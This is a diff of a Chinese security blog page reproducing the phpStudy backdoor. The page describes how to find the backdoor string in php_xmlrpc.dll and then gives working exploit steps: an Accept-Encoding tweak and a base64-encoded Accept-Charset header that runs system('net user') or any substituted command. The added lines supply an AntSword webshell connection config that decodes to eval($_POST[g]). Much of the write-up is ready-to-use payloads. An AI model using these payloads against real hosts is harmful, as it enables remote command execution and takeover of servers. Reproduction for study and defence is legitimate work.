@@ -35,8 +35,9 @@
 <meta property="og:image" content="https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/4.png">
 <meta property="og:image" content="https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png">
 <meta property="og:image" content="https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="https://www.wafer.org.cn/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/5.png">
 <meta property="article:published_time" content="2019-11-06T07:42:38.195Z">
-<meta property="article:modified_time" content="2019-10-18T02:34:20.148Z">
+<meta property="article:modified_time" content="2020-07-15T16:56:21.722Z">
 <meta property="article:author" content="waf&#39;s blog">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
@@ -290,7 +291,7 @@
 <a id="more"></a>
 <h2 id="后门验证"><a href="#后门验证" class="headerlink" title="后门验证"></a>后门验证</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p>
 <p>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>存在@eval(%s(‘%s’));即说明有后门。<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/4.png" alt="4.png"></p>
-<h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>访问ip地址用burp抓包<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png" alt="1.png"><br>在请求头里构造 Accept-Encoding 和 accept-charset 即可。<br>Accept-Encoding 已经有了，但是这里注意：<br>要把gzip, deflate 里gzip逗号后面的空格去掉，不然命令执行不成功。<br>然后在请求头里添加 accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Charset 的值就是行的命令，默认是system(‘net user’);<br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png" alt="6.png"><br>如果后续有时间，尽快能会写个批量扫描后门脚本</p>
+<h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>访问ip地址用burp抓包<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png" alt="1.png"><br>在请求头里构造 Accept-Encoding 和 accept-charset 即可。<br>Accept-Encoding 已经有了，但是这里注意：<br>要把gzip, deflate 里gzip逗号后面的空格去掉，不然命令执行不成功。<br>然后在请求头里添加 accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Charset 的值就是行的命令，默认是system(‘net user’);<br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png" alt="6.png"><br>如果后续有时间，尽快能会写个批量扫描后门脚本<br>这里给上蚁剑直接连接getshell配置<br>Value值 base64解码密码为g<br> <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">HTTP</span> <span class="string">HEADERS</span></span><br><span class="line"><span class="attr">Name</span>:  <span class="string">Accept-Charset</span></span><br><span class="line"><span class="attr">Value</span>: <span class="string">ZXZhbCgkX1BPU1RbZ10pOw==</span></span><br><span class="line"></span><br><span class="line"><span class="attr">HTTP</span> <span class="string">BODY</span></span><br><span class="line"><span class="attr">Name</span>: <span class="string">Accept-Encoding</span></span><br><span class="line"><span class="attr">Value</span>:  <span class="string">gzip,deflate</span></span><br></pre></td></tr></table></figure><br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/5.png" alt="5.png"></p>
 <p>此文章参考了<a href="https://dylan903.coding.me/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/" target="_blank" rel="noopener">dylan’s blog</a></p>
 
     </div>
@@ -448,7 +449,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
